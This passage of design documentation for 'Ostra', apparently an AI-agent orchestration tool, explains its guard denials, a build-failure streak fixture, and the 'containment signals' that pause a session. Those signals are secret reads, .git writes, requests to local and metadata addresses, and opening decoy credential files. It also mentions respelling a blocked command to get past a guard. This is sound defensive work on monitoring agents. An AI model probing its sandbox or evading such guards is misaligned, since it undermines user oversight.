spelling: a `Write` becomes a heredoc, and the heredoc becomes `python3 -c`. If a model gets the allowed
alternative, it uses that alternative. The reason clause after the correction explains why the rule exists. So
the model can apply the rule to a next case that the message did not name. This follows the writing rules of
Ostra for all text that models read: the instruction first, then the reason, and keep the "because."

Each denial also carries the name of the rule. The native executor shows the model
``Denied by guard `build-streak`: ...``, and the hook bridge appends `(Ostra guard: build-streak)`. So the model,
the Activity view, and a user who reads a transcript all see the same rule.

## A denial, end to end

The fixture `build_streak_forces_escalation_at_five` in
[`tests/policy.rs`](../../crates/ostra-policy/tests/policy.rs) runs through one build loop. The project profile
names Maven commands, and an implementer compiles five times. Each compile fails on `cannot find symbol`.

```rust
let p = ExecutionPolicy::new(
    f.ctx(AgentName::Implementer),
    PolicyInputs {
        build_commands: vec!["./mvnw -q -T1C compile".into()],
        test_commands: vec![
            "./mvnw test -Ptest".into(),
            "./mvnw test -Ptest -pl {MODULE} -am -Dtest={TEST}".into(),
        ],
        ..Default::default()
    },
);
// Attempts 1 to 5: each compile is allowed, then observed as a failure.
...
assert_eq!(p.build_streak(), 5);
let r = denied(&p, &bash("./mvnw -q -T1C compile"), "5 consecutive build or test failures");
assert!(r.starts_with("Call submit_implementer with status `stuck` (the STUCK: hand-back)"));
denied(&p, &bash("./mvnw test -Ptest -pl core -am -Dtest=FooTest"), "STUCK");
allowed(&p, &bash("cat src/main/java/Foo.java"));
```

The agent sees these results during the loop:

1. **Attempt 2.** The observer runs memory recall on the normalized diagnostic. If an earlier session recorded a
   lesson about that `cannot find symbol`, the observer appends it to the tool result. So a known fix arrives
   before the warning.
2. **Attempts 3 and 4.** The result ends with a warning. The warning tells the agent to state the root cause and
   what will change before the next attempt. It also says that the same diagnostic repeats, and that Ostra
   refuses further build commands after the fifth failure.
3. **Attempt 6.** The compile never runs. The agent gets this text:

   > Call submit_implementer with status \`stuck\` (the STUCK: hand-back) instead of another build or test
   > command: 5 consecutive build or test failures in this run, last diagnostic: "cannot find symbol ...".
   > Retrying is not the next step, because you do not yet have the information the fix needs. In the submit call
   > give what you were making work, the failing command, the diagnostic verbatim, the hypotheses you ruled out,
   > and the fact or decision you need. Do not retry under a different spelling of the command.

   Ostra also refuses a different test command that matches the `{MODULE}` template. But `cat` still runs,
   because the agent must read files to write a useful hand-back.

The same fixture continues after the block. When a later compile passes, the streak resets and a lesson is
pending. Then the lesson gate refuses the next `ok` submit of the implementer until it records what fixed the
build.

## Containment signals pause the session

A guard stops one tool call, and the agent reads the correction and continues. Most refusals are ordinary
mistakes, such as a write outside the scope of the phase. Some refusals look like an attempt to leave the sandbox:

- A read of the secrets of Ostra.
- A change to the files of Ostra.
- A write into `.git/`.
- A connection to a local network address.
- The opening of a decoy credential file.

When one execution does these things three times, Ostra pauses the session for the user. The reason is that a
model that keeps trying usually follows an instruction in something that it read (Rule P3).

A containment signal is one of these events:

- A Layer 1 denial by the `secret-read`, `self-protection`, or `git-metadata` guard.
- A refusal by the egress proxy of a loopback, private, or link-local destination. Examples are `10.0.0.1`, the
  cloud metadata address `169.254.169.254`, a local-only name such as `printer.local`, and a name that resolves to
  such an address. Only requests through the proxy count. On Linux, a connection to `127.0.0.1` stays on the
  loopback of the sandbox and never reaches the proxy. On macOS, the loopback setting of the workspace allows or
  refuses a direct connection to the services of the Mac, and this connection makes no signal.
- The opening of a decoy credential file by a process in the sandbox. Ostra puts these files in hidden paths,
  such as `~/.ssh/id_rsa` (see [sandboxing](sandboxing.md#decoy-credential-files)). This signal covers what the
  `secret-read` guard cannot see: a `cat` in Bash, a script, or a child process. On macOS, this signal works only
  on an admin account and only for decoy paths where a file exists, because the report comes from the system log.

A refused public host is not a signal, because builds and CLIs call telemetry hosts on their own. Ostra still
records it with the activity of the execution, together with the setting that can allow it.

[`containment::classify`](../../crates/ostra-core/src/containment.rs) turns each execution delta into a signal or
into nothing. The runner records each signal as a `ContainmentSignal` event, at most three for each execution. So
a retry loop cannot fill the session log. The proxy reports each host and port one time, so three signals from
the proxy are three different destinations. On the third signal of one execution, the fold pauses the session the
same way as the Pause of the user (Rules P1 and P2):

- Ostra interrupts each active execution.
- Ostra denies the permission asks that wait for an answer.
- Nothing new starts.

The board names the agent whose execution paused the session, and a push notification gives the reason.

When the user continues the session, the user tells Ostra that the signals were acceptable. The interrupted run
resumes where it stopped, as the same execution, and its signal count starts again at zero. When the user stops
the session, the session ends. The fixtures `p3_three_containment_signals_pause_the_session`,
`p3_decoy_opens_are_signals_like_the_others`, `p3_a_resumed_execution_counts_signals_from_zero`, and
`p3_two_signals_or_signals_spread_over_executions_do_not_pause` test the rule. The test
`containment_signals_pause_the_session` in
[`crates/ostra-engine/tests/pause.rs`](../../crates/ostra-engine/tests/pause.rs) runs it on a real engine.

## What YOLO changes, and what it does not

YOLO gives every decision to the orchestrator, so that a session can run without a person at the screen. In the
policy, YOLO does one thing: the session behaves as `bypass` mode, and every ask becomes an allow. Ostra records
this allow as `permission: yolo`. YOLO replaces the mode. So a session in plan mode that turns YOLO on also loses
the read-only refusals of plan mode.

YOLO does not change anything that is not a question:

- **Every guard still applies.** The fixture `yolo_answers_asks_but_not_denials` turns YOLO on and checks that
  the implementer still cannot write `src/a.test.ts`.
- **Explicit deny rules still apply.** In the same fixture, `Bash(git push *)` in the deny list still refuses
  `git push origin main` under YOLO. A deny rule is the "never" of the user. YOLO answers questions, but it does
  not change standing orders. The user must still confirm whether YOLO can ever lift a deny rule, and this
  question is listed as an open item.
- **The pipeline's own requirements hold.** Approval still needs a fact-check PASS. BLOCKER security findings must
  still be fixed before completion. YOLO never answers a budget gate.
- **Containment signals still pause.** If a session gets three containment signals in one execution, it pauses
  under YOLO too. Only the user can continue it.

The user can turn YOLO on or off during a session. The policy reads the current setting of the session before
each check (`policy.set_yolo(host.yolo())` in both executors). So the change applies from the next tool call.

## Where to look in the code

| Topic | File |
| --- | --- |
| `check`, layer 2, the read-only command set, the observer | [`crates/ostra-policy/src/policy.rs`](../../crates/ostra-policy/src/policy.rs) |
| Every guard and its denial text | [`crates/ostra-policy/src/guards.rs`](../../crates/ostra-policy/src/guards.rs) |
| Tool enforcement setting and its resolution | `ToolEnforcement` and `WorkspaceSettings::enforces_tool_calls` in [`crates/ostra-core/src/config.rs`](../../crates/ostra-core/src/config.rs), `Roots::strict` in [`guards.rs`](../../crates/ostra-policy/src/guards.rs) |
| Shell parsing and write targets | [`crates/ostra-policy/src/bash.rs`](../../crates/ostra-policy/src/bash.rs) |
| Build signal and streak thresholds | [`crates/ostra-policy/src/build.rs`](../../crates/ostra-policy/src/build.rs) |
| Permission rule syntax and matching | [`crates/ostra-policy/src/perms.rs`](../../crates/ostra-policy/src/perms.rs) |
| Containment signals and the classifier | [`crates/ostra-core/src/containment.rs`](../../crates/ostra-core/src/containment.rs) |
| Decoy credential files, their inotify watch, and the macOS log reader | [`crates/ostra-sandbox/src/decoy.rs`](../../crates/ostra-sandbox/src/decoy.rs), [`sys/linux/inotify.rs`](../../crates/ostra-sandbox/src/sys/linux/inotify.rs), [`sys/macos/log.rs`](../../crates/ostra-sandbox/src/sys/macos/log.rs) |
| Recording signals and the auto-pause | `EngineHost::record_signal` in [`crates/ostra-engine/src/runner.rs`](../../crates/ostra-engine/src/runner.rs), the fold in [`crates/ostra-engine/src/state.rs`](../../crates/ostra-engine/src/state.rs) |
| Guard and permission fixtures | [`crates/ostra-policy/tests/policy.rs`](../../crates/ostra-policy/tests/policy.rs) |
| Harness payload adapters | [`crates/ostra-exec-harness/src/adapters/`](../../crates/ostra-exec-harness/src/adapters/mod.rs) |
| Hook bridge, fail-closed handling | [`crates/ostra-exec-harness/src/bridge.rs`](../../crates/ostra-exec-harness/src/bridge.rs) |
